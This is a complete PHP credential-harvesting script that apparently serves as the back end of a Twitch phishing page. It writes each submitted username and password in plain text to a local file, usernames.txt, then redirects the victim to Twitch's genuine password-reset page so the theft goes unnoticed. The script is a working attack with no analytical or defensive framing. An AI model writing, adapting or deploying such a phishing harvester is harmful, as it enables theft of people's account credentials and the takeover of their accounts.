<?php

file_put_contents("usernames.txt", "Twitch Username: " . $_POST['Username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://passport.twitch.tv/password_resets/new?');
exit();
?>